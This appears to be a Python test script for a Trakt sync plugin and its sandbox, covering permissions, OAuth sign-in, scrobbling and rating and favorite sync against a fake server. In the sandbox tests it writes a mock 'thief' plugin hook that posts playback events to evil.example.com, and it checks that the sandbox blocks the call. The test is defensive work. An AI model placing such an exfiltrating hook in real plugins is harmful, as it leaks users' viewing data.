"""Tests the Trakt plugin and the sandbox features it needs (permissions "send" and "playback", request_json, the hook op).

Run from the repository root:   python3 tools/test_trakt_plugin.py

Nothing touches the network: hesper_guard's connection class is replaced by a fake Trakt, so the real policy code
(host list, permissions, header rules, no redirects) still runs.
"""
import base64
import hashlib
import json
import os
import re
import shutil
import sys
import tempfile
import time
import urllib.parse

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "android", "app", "src", "main", "python"))
import hesper_guard as g          # noqa: E402
import pek_flutter as pf          # noqa: E402

PLUGIN_SRC = os.path.join(ROOT, "plugin_packages", "trakt")
failures = []
CLIENT_ID = re.search(r'CLIENT_ID = "([^"]+)"', open(os.path.join(PLUGIN_SRC, "trakt_core.py")).read()).group(1)


def check(name, cond, extra=""):
    print(("PASS  " if cond else "FAIL  ") + name + ((" -> " + str(extra)) if (extra and not cond) else ""))
    if not cond:
        failures.append(name)


# ------------------------------------------------------------------------------------------ a fake Trakt
class Net:
    def __init__(self):
        self.log = []                 # (method, host, path, query, headers, body)
        self.polls = 0
        self.fail_scrobble_stop = False
        self.fail_ratings = False
        self.show_ratings = []
        self.watched_movies = []
        self.watched_shows = []
        self.favs = []
        self.fav_status = 200
        self.fav_acts = None          # None = Trakt reports no favorites time
        self.show_rated_at = ""
        self.episode_rated_at = ""
        self.episode_ratings = []
        self.rated_at = "2026-10-18T10:00:00.000Z"
        self.ratings = [{"rated_at": "2026-10-18T10:00:00.000Z", "rating": 9, "movie": {"title": "Heat", "year": 1995}}]
        self.activity = {"movies": "2026-10-20T10:00:00.000Z", "episodes": "2026-10-21T10:00:00.000Z"}
        self.movie_pages = [[{"watched_at": "2026-10-20T10:00:00.000Z", "movie": {"title": "Heat", "year": 1995}},
                             {"watched_at": "2026-10-19T10:00:00.000Z", "movie": {"title": "Alien", "year": 1979}}]]
        self.episode_pages = [[{"watched_at": "2026-10-21T10:00:00.000Z", "show": {"title": "Severance"}, "episode": {"season": 1, "number": 2}}]]

    def route(self, method, host, path, query, headers, body):
        q = urllib.parse.parse_qs(query)
        if host == "api.trakt.tv":
            if headers.get("trakt-api-key") != CLIENT_ID:
                return 403, None
            if path == "/oauth/device/code":
                if body.get("client_id") != CLIENT_ID or "client_secret" in body or body.get("code_challenge_method") != "S256" or not body.get("code_challenge"):
                    return 400, None
                self.challenge = body["code_challenge"]
                return 200, {"device_code": "DEV", "user_code": "ABCD1234", "verification_url": "https://trakt.tv/activate", "expires_in": 600, "interval": 3}
            if path == "/oauth/device/token":
                self.polls += 1
                v = body.get("code_verifier", "")
                ok = base64.urlsafe_b64encode(hashlib.sha256(v.encode()).digest()).decode().rstrip("=") == getattr(self, "challenge", None)
                if body.get("code") != "DEV" or "client_secret" in body or not ok:
                    return 400, None
                if self.polls < 2:
                    return 400, None
                return 200, {"access_token": "AT1", "refresh_token": "RT1", "expires_in": 86400, "created_at": int(time.time())}
            if path == "/oauth/token":
                if "client_secret" in body or body.get("client_id") != CLIENT_ID:
                    return 400, None
                return 200, {"access_token": "AT2", "refresh_token": "RT2", "expires_in": 86400, "created_at": int(time.time())}
            if path == "/oauth/revoke":
                return 200, {}
            authed = headers.get("Authorization", "").startswith("Bearer ")
            if path == "/search/movie":
                return 200, [{"type": "movie", "movie": {"title": "Heat", "year": 1995, "ids": {"trakt": 7}}}]
            if path == "/search/show":
                return 200, [{"type": "show", "show": {"title": "Severance", "ids": {"trakt": 1388}}}]
            if not authed:
                return 401, None
            if path == "/sync/last_activities":
                d = {"all": self.activity["episodes"], "movies": {"watched_at": self.activity["movies"], "rated_at": self.rated_at},
                     "episodes": {"watched_at": self.activity["episodes"], "rated_at": self.episode_rated_at}, "shows": {"rated_at": self.show_rated_at}}
                if self.fav_acts is not None:
                    d["movies"]["favorited_at"] = d["shows"]["favorited_at"] = self.fav_acts
                return 200, d
            if path == "/users/settings":
                return 200, {"user": {"username": "pek-fan"}}
            if path.startswith("/scrobble/"):
                if self.fail_scrobble_stop and path.endswith("stop"):
                    return 500, None
                return 201, {"id": 1}
            if path in ("/sync/ratings", "/sync/ratings/remove"):
                return (500, None) if self.fail_ratings else (201, {"added": {}})
            if path == "/sync/ratings/movies":
                return 200, self.ratings
            if path == "/sync/watched/movies":
                return 200, self.watched_movies
            if path == "/sync/watched/shows":
                return 200, self.watched_shows
            if path == "/sync/favorites":
                return (self.fav_status, self.favs) if self.fav_status != 200 or method == "GET" else (201, {"added": {}})
            if path == "/sync/favorites/remove":
                return 200, {"deleted": {}}
            if path == "/sync/ratings/shows":
                return 200, self.show_ratings
            if path == "/sync/ratings/episodes":
                return 200, self.episode_ratings
            if path in ("/sync/history", "/sync/history/remove"):
                return 201, {"added": {}}
            if path in ("/sync/history/movies", "/sync/history/episodes"):
                pages = self.movie_pages if path.endswith("movies") else self.episode_pages
                page = int(q.get("page", ["1"])[0])
                return 200, pages[page - 1]
        return 404, None


NET = Net()
PENDING_PAGE_COUNT = {"n": 1}


class FakeResp:
    def __init__(self, status, body, hdr):
        self.status, self.body, self.hdr = status, body, hdr

    def read(self, n=-1):
        return self.body

    def getheader(self, name, default=None):
        return self.hdr.get(name, default)


class FakeConn:
    def __init__(self, host, ip, **kw):
        self.host = host

    def request(self, method, path, body=None, headers=None):
        u = urllib.parse.urlsplit(path)
        data = json.loads(body.decode()) if body else None
        self.args = (method, self.host, u.path, u.query, dict(headers or {}), data)

    def getresponse(self):
        method, host, path, query, headers, data = self.args
        NET.log.append(self.args)
        status, payload = NET.route(method, host, path, query, headers, data)
        pc = {"X-Pagination-Page-Count": str(len(NET.movie_pages if path.endswith("movies") else NET.episode_pages))} if "/sync/history/" in path and method == "GET" else {}
        return FakeResp(status, json.dumps(payload).encode() if payload is not None else b"", pc)

    def close(self):
        pass


g._PinnedHTTPS = FakeConn
g._resolve_public = lambda host, port: "93.184.216.34"


def calls(prefix):
    return [c for c in NET.log if c[2].startswith(prefix)]


def hook(event, ctx=None, pid="trakt"):
    return json.loads(pf.call(json.dumps({"op": "hook", "id": pid, "event": event, "ctx": ctx or {}, "pluginsDir": PLUGINS})))


# ------------------------------------------------------------------------------------------ set up
TMP = tempfile.mkdtemp(prefix="pek-trakt-test-")
PLUGINS = os.path.join(TMP, "plugins")
os.makedirs(PLUGINS)
shutil.copytree(PLUGIN_SRC, os.path.join(PLUGINS, "trakt"), ignore=shutil.ignore_patterns("__pycache__", "data", "*.zip"))
DATA = os.path.join(PLUGINS, "trakt", "data")

try:
    # -------------------------------------------------------------------------------------- the sandbox
    check("plugin passes the safety scan", g.scan_plugin_folder(os.path.join(PLUGINS, "trakt")) == [])
    m, err = g.load_manifest(os.path.join(PLUGINS, "trakt"))
    check("manifest with send + playback + hooks is accepted", err is None, err)

    bad = os.path.join(TMP, "bad")
    os.makedirs(bad)
    json.dump({"permissions": {"playback": True}, "flutter": {"screen": "screen.py"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("playback without a hooks file is refused", g.load_manifest(bad)[1] is not None)
    json.dump({"permissions": {"send": "yes"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("send must be true/false", g.load_manifest(bad)[1] is not None)
    json.dump({"permissions": {}, "flutter": {"hooks": "../x.py"}}, open(os.path.join(bad, "plugin.json"), "w"))
    check("hooks file name is validated", g.load_manifest(bad)[1] is not None)

    def host_for(perms, hosts=("api.trakt.tv",)):
        return g.build_host_module("t", bad, {"permissions": dict(perms, network=list(hosts))})

    h_no = host_for({})
    try:
        h_no.request_json("GET", "https://api.trakt.tv/x")
        check("request_json needs the send permission", False)
    except PermissionError:
        check("request_json needs the send permission", True)
    h_ok = host_for({"send": True})
    try:
        h_ok.request_json("GET", "https://evil.example.com/x")
        check("request_json refuses hosts not listed", False)
    except PermissionError:
        check("request_json refuses hosts not listed", True)
    try:
        h_ok.request_json("GET", "http://api.trakt.tv/x")
        check("request_json refuses http", False)
    except PermissionError:
        check("request_json refuses http", True)
    try:
        h_ok.request_json("DELETE", "https://api.trakt.tv/x")
        check("request_json only allows GET and POST", False)
    except ValueError:
        check("request_json only allows GET and POST", True)
    NET.log.clear()
    r = h_ok.request_json("POST", "https://api.trakt.tv/scrobble/start", body={"a": 1}, headers={"Authorization": "Bearer X", "Cookie": "no", "trakt-api-key": CLIENT_ID})
    sent = NET.log[-1][4]
    check("Authorization passes, Cookie is dropped", sent.get("Authorization") == "Bearer X" and "Cookie" not in sent, sent)
    check("request_json returns status and data", r["status"] == 401 or r["status"] == 201, r)
    try:
        h_ok.request_json("POST", "https://api.trakt.tv/x", body={"x": "a" * 300000})
        check("request body is capped", False)
    except ValueError:
        check("request body is capped", True)

    # -------------------------------------------------------------------------------------- hook op guards
    ev = pf._clean_event({"type": "play", "kind": "movie", "title": "  Heat ", "year": "1995", "position": 50, "duration": 100, "path": "/secret/file.mkv", "id": "abc"})
    check("event keeps only the allowed fields", ev is not None and set(ev) == {"type", "kind", "title", "year", "season", "episode", "position", "duration", "percent"}, ev)
    check("percent is computed and clamped", ev["percent"] == 50.0 and pf._clean_event({"type": "stop", "kind": "movie", "title": "x", "position": 500, "duration": 100})["percent"] == 100.0)
    check("unknown event / bad item rejected", pf._clean_event({"type": "boom"}) is None and pf._clean_event({"type": "play", "kind": "other", "title": "x"}) is None)
    NET.log.clear()
    check("not-signed-in plugin does nothing", hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995, "position": 1, "duration": 100})["ok"] and not calls("/scrobble"))

    other = os.path.join(PLUGINS, "nohook")
    os.makedirs(other)
    json.dump({"permissions": {"network": ["api.trakt.tv"], "send": True}, "flutter": {"screen": "screen.py"}}, open(os.path.join(other, "plugin.json"), "w"))
    open(os.path.join(other, "screen.py"), "w").write("def render():\n    return None\n")
    r = hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995}, pid="nohook")
    check("plugin without the playback permission gets no events", r["ok"] is False, r)

    thief = os.path.join(PLUGINS, "thief")
    os.makedirs(thief)
    json.dump({"permissions": {"network": ["api.trakt.tv"], "send": True, "playback": True}, "flutter": {"screen": "screen.py", "hooks": "hooks.py"}}, open(os.path.join(thief, "plugin.json"), "w"))
    open(os.path.join(thief, "screen.py"), "w").write("def render():\n    return None\n")
    open(os.path.join(thief, "hooks.py"), "w").write("import pek_host as h\n\ndef on_event(ev):\n    h.request_json('POST', 'https://evil.example.com/steal', body=ev)\n")
    NET.log.clear()
    r = hook({"type": "play", "kind": "movie", "title": "Heat", "year": 1995}, pid="thief")
    check("a hook cannot reach a host it did not list", r["ok"] is False and not any(c[1] == "evil.example.com" for c in NET.log), r)

    # -------------------------------------------------------------------------------------- sign in through the screen
    def flutter(req):
        req["pluginsDir"] = PLUGINS
        return json.loads(pf.call(json.dumps(req)))

    def find(node, label):
        if isinstance(node, dict):
            if node.get("t") == "button" and node.get("s") == label:
                return node.get("on")
            for v in node.values():
                f = find(v, label)
                if f:
                    return f
        elif isinstance(node, list):
            for v in node:
                f = find(v, label)
                if f:
                    return f
        return None

    def texts(node, out=None):
        out = [] if out is None else out
        if isinstance(node, dict):
            if node.get("t") in ("text", "heading") and node.get("s"):
                out.append(node["s"])
            for v in node.values():
                texts(v, out)
        elif isinstance(node, list):
            for v in node:
                texts(v, out)
        return out

    r = flutter({"op": "open", "id": "trakt", "ctx": {}})
    check("screen opens", r.get("ok"), r)
    hid = find(r["tree"], "Connect to Trakt")
    check("screen offers Connect", bool(hid))
    r = flutter({"op": "event", "id": "trakt", "handler": hid, "ctx": {}})
    deadline = time.time() + 6
    code_seen = False
    while time.time() < deadline:
        r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
        if "ABCD1234" in texts(r.get("tree")):
            code_seen = True
            break
        time.sleep(0.2)
    check("screen shows the device code", code_seen, texts(r.get("tree")))
    deadline = time.time() + 15
    linked = False
    while time.time() < deadline:
        r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
        if find(r.get("tree"), "Disconnect"):
            linked = True
            break
        time.sleep(0.5)
    check("screen links after approval and stores the token", linked and json.load(open(os.path.join(DATA, "auth.json")))["access_token"] == "AT1", texts(r.get("tree")))
    time.sleep(1.5)                      # the first import runs in the background after sign-in
    r = flutter({"op": "poll", "id": "trakt", "since": -1, "ctx": {}})
    check("sign-in is followed by an import into PEK", any(e.get("op") == "watched.set_many" for e in r.get("effects", [])) or any("Trakt history is in PEK" in t for t in texts(r.get("tree"))), texts(r.get("tree")))
    check("screen shows the user name", any("pek-fan" in t for t in texts(r.get("tree"))), texts(r.get("tree")))
    flutter({"op": "close", "id": "trakt"})
    json.dump({}, open(os.path.join(DATA, "sync.json"), "w"))      # so the pull test below starts from nothing

    # -------------------------------------------------------------------------------------- scrobbling
    NET.log.clear()
    movie = {"kind": "movie", "title": "Heat", "year": 1995, "duration": 6000}
    r = hook(dict(movie, type="play", position=600))
    check("play -> scrobble/start with token, key and progress", r["ok"] and len(calls("/scrobble/start")) == 1, r)
    c = calls("/scrobble/start")[0]
    check("scrobble body has the Trakt id and progress", c[5] == {"movie": {"ids": {"trakt": 7}}, "progress": 10.0}, c[5])
    check("scrobble sends the bearer token and api key", c[4].get("Authorization") == "Bearer AT1" and c[4].get("trakt-api-key") == CLIENT_ID, c[4])
    hook(dict(movie, type="pause", position=1200))
    check("pause -> scrobble/pause", len(calls("/scrobble/pause")) == 1 and calls("/scrobble/pause")[0][5]["progress"] == 20.0)
    hook(dict(movie, type="stop", position=5700))
    check("stop -> scrobble/stop at 95%", len(calls("/scrobble/stop")) == 1 and calls("/scrobble/stop")[0][5]["progress"] == 95.0)
    check("the movie id was looked up once and remembered", len(calls("/search/movie")) == 1)

    ep = {"kind": "episode", "title": "Severance", "season": 1, "episode": 3, "duration": 3000}
    hook(dict(ep, type="play", position=0))
    c = calls("/scrobble/start")[-1]
    check("episode scrobble uses show id + season/number", c[5] == {"show": {"ids": {"trakt": 1388}}, "episode": {"season": 1, "number": 3}, "progress": 0.0}, c[5])

    # a finished watch that could not be sent is kept and sent later
    NET.fail_scrobble_stop = True
    NET.log.clear()
    hook(dict(movie, type="stop", position=5900))
    q = json.load(open(os.path.join(DATA, "queue.json")))
    check("a failed 'stop' at 95% is queued", len(q) == 1 and q[0]["title"] == "Heat", q)
    NET.fail_scrobble_stop = False
    NET.log.clear()
    r = hook({"type": "app_start"})
    hist = calls("/sync/history")
    check("app_start resends the queue", r["ok"] and any(c[2] == "/sync/history" and c[5].get("movies") for c in hist) and json.load(open(os.path.join(DATA, "queue.json"))) == [], hist)

    # -------------------------------------------------------------------------------------- import
    effects = r["effects"]
    items = [i for e in effects if e["op"].startswith("watched") for i in e["items"]]
    titles = {(i["kind"], i["title"]) for i in items}
    check("app_start imports Trakt history as watched.set_many", {("movie", "Heat"), ("movie", "Alien"), ("episode", "Severance")} <= titles, items)
    check("import effects are limited to watched and ratings", all(e["op"] in ("watched.set", "watched.set_many", "ratings.set_many") for e in effects))
    NET.log.clear()
    r = hook({"type": "app_start"})
    st = [c for c in calls("/sync/history/") if "start_at" in c[3]]
    check("the second import only asks for newer history (start_at)", len(st) == 2, [c[3] for c in calls("/sync/history/")])

    # -------------------------------------------------------------------------------------- watch dates
    import calendar
    want = {("movie", "Heat"): calendar.timegm((2026, 10, 20, 10, 0, 0)), ("movie", "Alien"): calendar.timegm((2026, 10, 19, 10, 0, 0)),
            ("episode", "Severance"): calendar.timegm((2026, 10, 21, 10, 0, 0))}
    r = hook({"type": "app_start"})
    got = {(i["kind"], i["title"]): i.get("at") for e in r["effects"] if e["op"].startswith("watched") for i in e["items"]}
    check("imported items carry the day they were watched on Trakt", got == want, got)

    # the newest watch of an item wins
    keep_movies = NET.movie_pages
    NET.movie_pages = [[{"watched_at": "2026-10-22T09:00:00.000Z", "movie": {"title": "Heat", "year": 1995}},
                        {"watched_at": "2026-01-02T09:00:00.000Z", "movie": {"title": "Heat", "year": 1995}}]]
    r = hook({"type": "app_start"})
    heat = [i for e in r["effects"] if e["op"].startswith("watched") for i in e["items"] if i["title"] == "Heat"]
    check("a rewatched movie is dated by its newest watch", len(heat) == 1 and heat[0]["at"] == calendar.timegm((2026, 10, 22, 9, 0, 0)), heat)
    NET.movie_pages = keep_movies

    # the plugin API: a believable \"at\" passes, nonsense becomes 0 (= now)
    import pek_ui
    check("pek_ui keeps a believable watch time", pek_ui._watch_time(want[("movie", "Heat")]) == want[("movie", "Heat")])
    check("pek_ui drops a time before 2000, a future time and junk", pek_ui._watch_time(5) == 0 and pek_ui._watch_time(time.time() + 10 * 86400) == 0 and pek_ui._watch_time("x") == 0 and pek_ui._watch_time(None) == 0)

    # -------------------------------------------------------------------------------------- tick (the periodic check)
    check("tick is an accepted event and needs no fields", pf._clean_event({"type": "tick"}) == {"type": "tick"})
    NET.log.clear()
    r = hook({"type": "app_start"})                      # remembers Trakt's last_activities
    NET.log.clear()
    r = hook({"type": "tick"})
    check("tick with nothing new costs one request and imports nothing", r["ok"] and [c[2] for c in NET.log] == ["/sync/last_activities"] and not r["effects"], [c[2] for c in NET.log])

    NET.activity = {"movies": "2026-10-20T10:00:00.000Z", "episodes": "2026-10-23T12:00:00.000Z"}
    keep_eps, keep_movies = NET.episode_pages, NET.movie_pages
    NET.episode_pages = [[{"watched_at": "2026-10-23T12:00:00.000Z", "show": {"title": "Severance"}, "episode": {"season": 1, "number": 6}}]]
    NET.movie_pages = [[]]
    NET.log.clear()
    r = hook({"type": "tick"})
    items = [i for e in r["effects"] if e["op"].startswith("watched") for i in e["items"]]
    check("tick with something new fetches the history since last time", any("start_at" in c[3] for c in calls("/sync/history/")), [c[3] for c in calls("/sync/history/")])
    check("a watch made elsewhere reaches PEK TV with its date", items == [{"kind": "episode", "title": "Severance", "year": 0, "season": 1, "episode": 6, "at": calendar.timegm((2026, 10, 23, 12, 0, 0))}], items)
    NET.log.clear()
    r = hook({"type": "tick"})
    check("the next tick is quiet again", [c[2] for c in NET.log] == ["/sync/last_activities"] and not r["effects"], [c[2] for c in NET.log])
    NET.episode_pages, NET.movie_pages = keep_eps, keep_movies

    st_file = os.path.join(DATA, "settings.json")
    saved_settings = open(st_file).read() if os.path.exists(st_file) else None      # no file = the defaults
    cfg = json.loads(saved_settings) if saved_settings else {}
    cfg["pull"] = False
    cfg["ratings"] = False
    cfg["favorites"] = False
    open(st_file, "w").write(json.dumps(cfg))
    NET.log.clear()
    r = hook({"type": "tick"})
    check("tick does nothing when the import switch is off", r["ok"] and not NET.log, [c[2] for c in NET.log])
    if saved_settings is None:
        os.remove(st_file)
    else:
        open(st_file, "w").write(saved_settings)

    # -------------------------------------------------------------------------------------- ratings
    NET.log.clear()
    r = hook({"type": "rated", "items": [{"kind": "movie", "title": "Heat", "year": 1995, "rating": 8}]})
    sent = calls("/sync/ratings")
    body = sent[0][5] if sent else {}
    check("rating a movie -> one /sync/ratings call", r["ok"] and len(sent) == 1 and sent[0][2] == "/sync/ratings", [c[2] for c in NET.log])
    check("the rating is the 1-10 value with a rated_at", body.get("movies", [{}])[0].get("rating") == 8 and body["movies"][0].get("rated_at", "").endswith("Z") and body["movies"][0]["ids"] == {"trakt": 7}, body)
    NET.log.clear()
    hook({"type": "rated", "items": [{"kind": "movie", "title": "Heat", "year": 1995, "rating": 0}]})
    check("removing a rating -> /sync/ratings/remove", [c[2] for c in calls("/sync/ratings")] == ["/sync/ratings/remove"] and "rating" not in calls("/sync/ratings/remove")[0][5]["movies"][0], [c[2] for c in NET.log])

    NET.log.clear()
    r = hook({"type": "tick"})
    check("tick with no new rating costs one request", [c[2] for c in NET.log] == ["/sync/last_activities"] and not r["effects"], [c[2] for c in NET.log])
    NET.rated_at = "2026-10-24T09:00:00.000Z"
    NET.ratings = [{"rated_at": "2026-10-24T09:00:00.000Z", "rating": 7, "movie": {"title": "Alien", "year": 1979}}]
    NET.log.clear()
    r = hook({"type": "tick"})
    rated_fx = [e for e in r["effects"] if e["op"] == "ratings.set_many"]
    check("a rating made on Trakt reaches PEK TV with its date",
          len(rated_fx) == 1 and rated_fx[0]["items"] == [{"kind": "movie", "title": "Alien", "year": 1979, "season": 0, "episode": 0, "rating": 7, "at": calendar.timegm((2026, 10, 24, 9, 0, 0))}], r["effects"])
    NET.log.clear()
    hook({"type": "tick"})
    check("the next tick is quiet about ratings", [c[2] for c in NET.log] == ["/sync/last_activities"])

    NET.fail_ratings = True
    NET.log.clear()
    hook({"type": "rated", "items": [{"kind": "movie", "title": "Heat", "year": 1995, "rating": 6}]})
    queued = json.load(open(os.path.join(DATA, "rqueue.json"))) if os.path.exists(os.path.join(DATA, "rqueue.json")) else {}
    check("a rating that could not be sent is kept", len(queued) == 1 and list(queued.values())[0]["rating"] == 6, queued)
    NET.fail_ratings = False
    NET.log.clear()
    hook({"type": "app_start"})
    resent = calls("/sync/ratings")
    check("and sent at the next start", len(resent) >= 1 and resent[0][5]["movies"][0]["rating"] == 6 and not json.load(open(os.path.join(DATA, "rqueue.json"))), [c[2] for c in NET.log])

    cfg2 = json.loads(open(st_file).read()) if os.path.exists(st_file) else {}
    cfg2["ratings"] = False
    open(st_file, "w").write(json.dumps(cfg2))
    NET.log.clear()
    hook({"type": "rated", "items": [{"kind": "movie", "title": "Heat", "year": 1995, "rating": 5}]})
    check("the ratings switch turns rating sync off", not NET.log, [c[2] for c in NET.log])
    cfg2["ratings"] = True
    open(st_file, "w").write(json.dumps(cfg2))
    r = hook({"type": "rated", "items": [{"kind": "season", "title": "Severance", "season": 1, "rating": 5}]})
    check("only movies, episodes and shows can be rated", not r["ok"] and not calls("/sync/ratings"), r)

    # episodes and whole shows
    NET.log.clear()
    hook({"type": "rated", "items": [{"kind": "episode", "title": "Severance", "season": 1, "episode": 2, "rating": 9},
                                     {"kind": "episode", "title": "Severance", "season": 1, "episode": 3, "rating": 7},
                                     {"kind": "show", "title": "Severance", "rating": 10}]})
    body = calls("/sync/ratings")[0][5] if calls("/sync/ratings") else {}
    shows = body.get("shows", [])
    ep_entry = [s for s in shows if "seasons" in s]
    show_entry = [s for s in shows if "rating" in s]
    check("episode ratings go up grouped show > season > episode",
          len(ep_entry) == 1 and ep_entry[0]["seasons"][0]["number"] == 1 and [(e["number"], e["rating"]) for e in ep_entry[0]["seasons"][0]["episodes"]] == [(2, 9), (3, 7)], body)
    check("a show rating is its own entry with the show's rating", len(show_entry) == 1 and show_entry[0]["rating"] == 10 and show_entry[0]["rated_at"].endswith("Z"), body)
    NET.log.clear()
    hook({"type": "rated", "items": [{"kind": "episode", "title": "Severance", "season": 1, "episode": 2, "rating": 0}]})
    rb = calls("/sync/ratings/remove")[0][5] if calls("/sync/ratings/remove") else {}
    check("removing an episode rating -> /sync/ratings/remove with no rating", rb.get("shows", [{}])[0].get("seasons", [{}])[0].get("episodes") == [{"number": 2}], rb)

    NET.show_ratings = [{"rated_at": "2026-10-24T10:00:00.000Z", "rating": 8, "show": {"title": "Andor", "year": 2022}}]
    NET.episode_ratings = [{"rated_at": "2026-10-24T11:00:00.000Z", "rating": 6, "show": {"title": "Andor", "year": 2022}, "episode": {"season": 1, "number": 4}}]
    NET.rated_at = "2026-10-24T12:00:00.000Z"
    NET.show_rated_at, NET.episode_rated_at = "2026-10-24T10:00:00.000Z", "2026-10-24T11:00:00.000Z"
    r = hook({"type": "tick"})
    fx = [i for e in r["effects"] if e["op"] == "ratings.set_many" for i in e["items"]]
    check("Trakt show and episode ratings come into PEK TV",
          {(i["kind"], i["title"], i.get("season"), i.get("episode"), i["rating"]) for i in fx} >= {("show", "Andor", 0, 0, 8), ("episode", "Andor", 1, 4, 6)}, fx)
    NET.log.clear()
    hook({"type": "tick"})
    check("and the next tick is quiet again", [c[2] for c in NET.log] == ["/sync/last_activities"], [c[2] for c in NET.log])

    # -------------------------------------------------------------------------------------- removals made on Trakt
    def fx(r, op):
        return [e for e in r["effects"] if e["op"] == op]

    # a rating removed on Trakt comes back as rating 0 (Alien was imported above, so it is in the snapshot)
    NET.ratings, NET.rated_at = [], "2026-10-25T09:00:00.000Z"
    r = hook({"type": "tick"})
    gone = [i for e in fx(r, "ratings.set_many") for i in e["items"] if i["rating"] == 0]
    check("a rating removed on Trakt is removed in PEK TV, with the time we last looked",
          any(i["title"] == "Alien" and i["kind"] == "movie" and i["at"] > 0 for i in gone), r["effects"])
    NET.log.clear()
    r = hook({"type": "tick"})
    check("and only once", not [i for e in fx(r, "ratings.set_many") for i in e["items"]] and [c[2] for c in NET.log] == ["/sync/last_activities"], [c[2] for c in NET.log])

    # a big part of the list vanishing at once is held back once: it may be a bad answer, not a clean-out
    NET.show_ratings = [{"rated_at": "2026-10-25T10:00:00.000Z", "rating": 7, "show": {"title": "Show %d" % i, "year": 2000}} for i in range(40)]
    NET.show_rated_at = "2026-10-25T10:00:00.000Z"
    hook({"type": "tick"})
    NET.show_ratings, NET.show_rated_at = [], "2026-10-25T11:00:00.000Z"
    r = hook({"type": "tick"})
    check("a list that suddenly empties is held back the first time", not [i for e in fx(r, "ratings.set_many") for i in e["items"] if i["rating"] == 0], r["effects"])
    r = hook({"type": "tick"})
    zero = [i for e in fx(r, "ratings.set_many") for i in e["items"] if i["rating"] == 0]
    check("and removed when Trakt says the same again", len([i for i in zero if i["title"].startswith("Show ")]) == 40, len(zero))
    NET.log.clear()
    hook({"type": "tick"})
    check("then the check is quiet again", [c[2] for c in NET.log] == ["/sync/last_activities"], [c[2] for c in NET.log])

    # a watch removed on Trakt
    NET.watched_movies = [{"plays": 1, "movie": {"title": "Heat", "year": 1995}}, {"plays": 2, "movie": {"title": "Alien", "year": 1979}}]
    NET.watched_shows = [{"plays": 3, "show": {"title": "Severance"}, "seasons": [{"number": 1, "episodes": [{"number": 1, "plays": 1}, {"number": 2, "plays": 1}]}]}]
    NET.activity = {"movies": "2026-10-26T10:00:00.000Z", "episodes": "2026-10-26T10:00:00.000Z"}
    hook({"type": "tick"})
    NET.watched_movies = [{"plays": 1, "movie": {"title": "Heat", "year": 1995}}]
    NET.watched_shows = [{"plays": 3, "show": {"title": "Severance"}, "seasons": [{"number": 1, "episodes": [{"number": 1, "plays": 1}]}]}]
    NET.activity = {"movies": "2026-10-26T11:00:00.000Z", "episodes": "2026-10-26T11:00:00.000Z"}
    r = hook({"type": "tick"})
    removed = [i for e in fx(r, "watched.set_many") if e["value"] is False for i in e["items"]]
    check("a watch removed on Trakt is unmarked in PEK TV (movie and episode)",
          {(i["kind"], i["title"], i["season"], i["episode"]) for i in removed} == {("movie", "Alien", 0, 0), ("episode", "Severance", 1, 2)} and all(i["at"] > 0 for i in removed), r["effects"])
    NET.log.clear()
    r = hook({"type": "tick"})
    check("history removals cost nothing when nothing changed", [c[2] for c in NET.log] == ["/sync/last_activities"], [c[2] for c in NET.log])
    NET.watched_movies = []
    NET.activity = {"movies": "2026-10-26T12:00:00.000Z", "episodes": "2026-10-26T11:00:00.000Z"}
    cfg3 = json.loads(open(st_file).read())
    cfg3["removals"] = False
    open(st_file, "w").write(json.dumps(cfg3))
    r = hook({"type": "tick"})
    check("the removals switch keeps Trakt removals out of PEK TV", not [e for e in fx(r, "watched.set_many") if e["value"] is False], r["effects"])
    cfg3["removals"] = True
    open(st_file, "w").write(json.dumps(cfg3))

    # -------------------------------------------------------------------------------------- favorites
    NET.log.clear()
    r = hook({"type": "favorited", "value": True, "items": [{"kind": "movie", "title": "Heat", "year": 1995, "tmdb": 949}, {"kind": "show", "title": "Severance", "year": 0, "tmdb": 0}]})
    sent = calls("/sync/favorites")
    body = sent[0][5] if sent else {}
    check("favoriting goes up with the TMDb id when PEK knows it, and a Trakt id otherwise",
          r["ok"] and sent and sent[0][2] == "/sync/favorites" and body.get("movies") == [{"ids": {"tmdb": 949}}] and list(body["shows"][0]["ids"]) == ["trakt"], body)
    NET.log.clear()
    hook({"type": "favorited", "value": False, "items": [{"kind": "movie", "title": "Heat", "year": 1995, "tmdb": 949}]})
    check("removing a favorite -> /sync/favorites/remove", [c[2] for c in calls("/sync/favorites")] == ["/sync/favorites/remove"], [c[2] for c in NET.log])
    r = hook({"type": "favorited", "value": True, "items": [{"kind": "episode", "title": "x"}]})
    check("only movies and shows can be favorites", not r["ok"], r)

    NET.fav_status = 500
    NET.log.clear()
    hook({"type": "favorited", "value": True, "items": [{"kind": "movie", "title": "Heat", "year": 1995, "tmdb": 949}]})
    fq = json.load(open(os.path.join(DATA, "fqueue.json"))) if os.path.exists(os.path.join(DATA, "fqueue.json")) else {}
    check("a favorite that could not be sent is kept", len(fq) == 1 and list(fq.values())[0]["value"] is True, fq)
    NET.fav_status = 200
    NET.log.clear()
    hook({"type": "app_start"})
    check("and sent at the next start", any(c[2] == "/sync/favorites" and c[0] == "POST" for c in NET.log) and not json.load(open(os.path.join(DATA, "fqueue.json"))), [c[2] for c in NET.log])

    NET.favs = [{"type": "movie", "movie": {"title": "Alien", "year": 1979, "ids": {"tmdb": 348}}}, {"type": "show", "show": {"title": "Andor", "ids": {"tmdb": 83867}}}]
    NET.log.clear()
    r = hook({"type": "tick"})
    check("without a favorites time from Trakt, a tick does not read the list", not [c for c in NET.log if c[2] == "/sync/favorites"], [c[2] for c in NET.log])
    NET.fav_acts = "2026-10-27T10:00:00.000Z"
    r = hook({"type": "tick"})
    added = [i for e in fx(r, "favorites.set_many") if e["value"] is True for i in e["items"]]
    check("Trakt favorites come into PEK TV with their TMDb ids",
          {(i["kind"], i["title"], i["tmdb"]) for i in added} == {("movie", "Alien", 348), ("show", "Andor", 83867)}, r["effects"])
    NET.log.clear()
    hook({"type": "tick"})
    check("the next tick is quiet about favorites", [c[2] for c in NET.log] == ["/sync/last_activities"], [c[2] for c in NET.log])
    NET.favs = [{"type": "show", "show": {"title": "Andor", "ids": {"tmdb": 83867}}}]
